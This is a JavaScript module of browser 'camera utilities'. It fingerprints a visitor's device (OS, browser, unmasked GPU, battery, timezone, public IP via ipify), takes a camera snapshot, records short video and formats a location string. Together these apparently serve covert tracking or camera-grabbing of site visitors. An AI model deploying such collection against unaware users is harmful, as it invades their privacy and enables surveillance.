// Camera utilities extracted and modernized from OLD.js

export function detectOperatingSystem(userAgent) {
    if (userAgent.includes("Windows NT 10.0")) return "Windows 10"
    if (userAgent.includes("Windows NT 6.3")) return "Windows 8.1"
    if (userAgent.includes("Windows NT 6.2")) return "Windows 8"
    if (userAgent.includes("Windows NT 6.1")) return "Windows 7"
    if (userAgent.includes("Windows NT 6.0")) return "Windows Vista"
    if (userAgent.includes("Windows NT 5.1")) return "Windows XP"
    if (userAgent.includes("Win")) return "Windows (Other)"
    if (userAgent.includes("Mac")) return "MacOS"
    if (userAgent.includes("X11")) return "UNIX"
    if (userAgent.includes("Linux")) return "Linux"
    if (userAgent.includes("Android")) return "Android"
    if (userAgent.includes("like Mac OS X")) {
        if (userAgent.includes("iPhone")) return "iOS (iPhone)"
        if (userAgent.includes("iPad")) return "iOS (iPad)"
        return "iOS (Other)"
    }
    return "Unknown or Protected OS"
}

export function detectBrowser(userAgent) {
    if (userAgent.includes("Firefox") && !userAgent.includes("Seamonkey")) return "Firefox"
    if (userAgent.includes("Seamonkey")) return "Seamonkey"
    if (userAgent.includes("Chrome") && !userAgent.includes("Chromium")) return "Chrome"
    if (userAgent.includes("Chromium")) return "Chromium"
    if (userAgent.includes("Safari") && !userAgent.includes("Chrome") && !userAgent.includes("Chromium")) return "Safari"
    if (userAgent.includes("OPR") || userAgent.includes("Opera")) return "Opera"
    if (userAgent.includes("MSIE") || userAgent.includes("Trident/")) return "Internet Explorer"
    if (userAgent.includes("Edge")) return "Edge"
    return "Unknown or Protected Browser"
}

export function detectMobileBrowser(userAgent) {
    if (userAgent.includes("Firefox") && !userAgent.includes("Seamonkey")) return "Firefox"
    if (userAgent.includes("Seamonkey")) return "Seamonkey"
    if (userAgent.includes("Chrome") && !userAgent.includes("Chromium")) return "Chrome"
    if (userAgent.includes("CriOS")) return "Chrome for iOS"
    if (userAgent.includes("Chromium")) return "Chromium"
    if (userAgent.includes("Safari") && !userAgent.includes("Chrome") && !userAgent.includes("Chromium") && !userAgent.includes("CriOS")) return "Safari"
    if (userAgent.includes("OPR") || userAgent.includes("Opera")) return "Opera"
    if (userAgent.includes("SamsungBrowser")) return "Samsung Internet"
    if (userAgent.includes("HuaweiBrowser")) return "Huawei Browser"
    return "Unknown or Protected Browser"
}

export function getSystemDetails() {
    const userAgent = navigator.userAgent;
    const operatingSystem = detectOperatingSystem(userAgent);
    let browser;
    
    if (/Mobile|Tablet|Android|iPhone|iPad/i.test(userAgent)) {
        browser = detectMobileBrowser(userAgent);
    } else {
        browser = detectBrowser(userAgent);
    }
    
    return { 
        operatingSystem, 
        browser,
        deviceType: /Mobile|Tablet|Android|iPhone|iPad/i.test(userAgent) ? "Mobile" : "Desktop",
        screenResolution: `${window.screen.width}x${window.screen.height}`
    };
}

export async function getGPUDetails() {
    return new Promise(resolve => {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        
        if (!gl) {
            resolve({ vendor: "Not Available", renderer: "Not Available" });
            return;
        }
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            resolve({ vendor, renderer });
        } else {
            resolve({ vendor: "Not Available", renderer: "Not Available" });
        }
    });
}

export async function gatherMinimalInformation() {
    const info = {
        ip: "Unknown",
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown Timezone",
        language: navigator.language || "Unknown Language",
        deviceType: /Mobile|Tablet|Android|iPhone|iPad/.test(navigator.userAgent) ? "Mobile" : "Desktop",
        browser: (function() {
            const userAgent = navigator.userAgent;
            const match = userAgent.match(/(firefox|msie|chrome|safari|trident|opera|edge)[\/\s](\d+)/i) || [];
            return match[1] ? `${match[1]} ${match[2]}` : "Unknown Browser";
        })(),
        platform: navigator.platform || "Unknown Platform",
        cookiesEnabled: navigator.cookieEnabled ? "Enabled" : "Disabled",
        doNotTrack: navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack,
        currentTime: new Date().getTime(),
        hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
        connectionType: navigator.connection && navigator.connection.type ? navigator.connection.type : "Unknown",
        batteryLevel: "Unknown",
        isCharging: "Unknown"
    };

    // Try to get IP
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        if (response.ok) {
            const data = await response.json();
            info.ip = data.ip;
        }
    } catch(e) {}

    // Try to get battery info
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            info.batteryLevel = `${battery.level * 100}%`;
            info.isCharging = battery.charging ? "Charging" : "Not Charging";
        } catch(e) {}
    }

    return info;
}

export async function takePicture(constraints) {
    const stream = await navigator.mediaDevices.getUserMedia({
        audio: false,
        ...constraints
    });
    
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    video.srcObject = stream;
    video.setAttribute('playsinline', '');
    video.setAttribute('autoplay', '');
    
    await new Promise(resolve => video.addEventListener('loadedmetadata', resolve));
    video.play();
    
    await new Promise(resolve => setTimeout(resolve, 500));
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    stream.getTracks().forEach(track => track.stop());
    
    return new Promise((resolve) => {
        canvas.toBlob((blob) => {
            const reader = new FileReader();
            reader.onloadend = () => resolve(reader.result);
            reader.readAsDataURL(blob);
        }, 'image/jpeg', 0.8);
    });
}

export async function recordVideo(constraints, duration = 3000) {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    let options = undefined;
    
    if (MediaRecorder.isTypeSupported) {
        const mimeTypes = [
            'video/mp4',
            'video/webm',
            'video/webm;codecs=vp8',
            'video/webm;codecs=daala',
            'video/webm;codecs=h264',
            'video/mpeg'
        ];
        
        for (const type of mimeTypes) {
            if (MediaRecorder.isTypeSupported(type)) {
                options = { mimeType: type };
                break;
            }
        }
    }
    
    const mediaRecorder = new MediaRecorder(stream, options);
    const chunks = [];
    
    return new Promise((resolve, reject) => {
        mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) chunks.push(e.data);
        };
        
        mediaRecorder.onerror = (e) => {
            stream.getTracks().forEach(track => track.stop());
            reject(e);
        };
        
        mediaRecorder.onstop = () => {
            stream.getTracks().forEach(track => track.stop());
            const blob = new Blob(chunks, { type: options?.mimeType || 'video/webm' });
            const reader = new FileReader();
            reader.onloadend = () => {
                resolve(reader.result);
            };
            reader.readAsDataURL(blob);
        };
        
        mediaRecorder.start(100);
        setTimeout(() => mediaRecorder.stop(), duration);
    });
}

export async function takePictureFromStream(stream) {
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    video.srcObject = stream;
    video.setAttribute('playsinline', '');
    
    await new Promise(resolve => video.addEventListener('loadedmetadata', resolve));
    video.play();
    
    await new Promise(resolve => setTimeout(resolve, 100));
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    
    return new Promise((resolve) => {
        canvas.toBlob((blob) => {
            const reader = new FileReader();
            reader.onloadend = () => resolve(reader.result);
            reader.readAsDataURL(blob);
        }, 'image/jpeg', 0.8);
    });
}

export function getLocationValue(location) {
    if (!location) return "N/A";
    if (location.region == null && location.city && location.country_name) 
        return `${location.city}, ${location.country_name}`;
    if (location.city == location.country_name) return location.city;
    if (location.city && location.region && location.country_name) 
        return `${location.city}, ${location.region}, ${location.country_name}`;
    return "N/A";
}
